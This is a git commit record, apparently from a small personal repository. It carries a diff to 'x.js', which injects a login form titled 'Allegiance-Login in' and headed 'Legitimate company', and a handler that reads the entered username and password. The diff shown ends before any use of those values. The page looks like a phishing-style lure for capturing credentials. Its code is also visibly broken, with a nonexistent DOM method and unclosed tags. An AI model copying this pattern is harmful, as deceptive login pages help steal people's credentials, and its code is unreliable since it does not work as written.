c1e25397f60207df966e2394eeec3b56eb7baf4d
meaning123 <89698201+meaning123@users.noreply.github.com>
2021-08-28 16:40:32 +0000

    Update x.js

--- x.js
+++ x.js
@@ -1,5 +1,5 @@
 document.title = 'Allegiance-Login in';
-document.getElementById('template').innerHTML = "<center><h1>Legitimate company<h1><p>username: <input type=textbox name=username</p><p>password: <input type=textbox name=password</p><button onclick="myFunction()">Submit</button></center>";
+document.getElementById('template').innerHTML = "<center><h1>Legitimate company<h1><p>username: <input type=textbox name=username</p><p>password: <input type=textbox name=password</p><button onclick='myFunction()'>Submit</button></center>";
 function myFunction() {
   var username = document.getElementByName('username');
   var password = document.getElementByName('password');
